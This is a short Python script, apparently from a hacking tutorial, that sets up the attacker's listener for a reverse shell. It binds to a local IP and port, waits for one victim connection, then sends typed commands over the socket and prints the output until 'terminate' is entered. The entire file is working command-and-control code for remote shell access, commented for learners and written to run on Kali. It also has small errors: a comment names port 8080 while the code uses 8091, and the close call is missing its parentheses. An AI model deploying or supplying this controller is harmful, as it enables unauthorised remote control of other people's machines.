import socket

# Verify that the program is running on kali by running
# the following command 'netstat -antp | grep 8080

def connect():
    s = socket.socket() # Define Socket object s
    s.bind(("192.168.2.22",8091)) # Bind ip and port
    s.listen(1) # Single connection 1 session
    conn , addr = s.accept() # Call the accept function accept inbound connection. Conn object and addr(ip and port)
    print ('[+] we got a connection from', addr) # Show IP and port address
    
    while True:#Infinite loop
        command = input("Shell> ") # Get the user input and store in command
        if 'terminate' in command: # if 'terminate' is in the command close session
            conn.send('terminate'.encode())#encode unicode string into a sequence of bytes
            conn.close
            break
        else:
            conn.send(command.encode())#Send to client and encode
            print (conn.recv(1024).decode())#Read 1kilobyte of date bytes to unicode use decode
def main():
    connect()
main()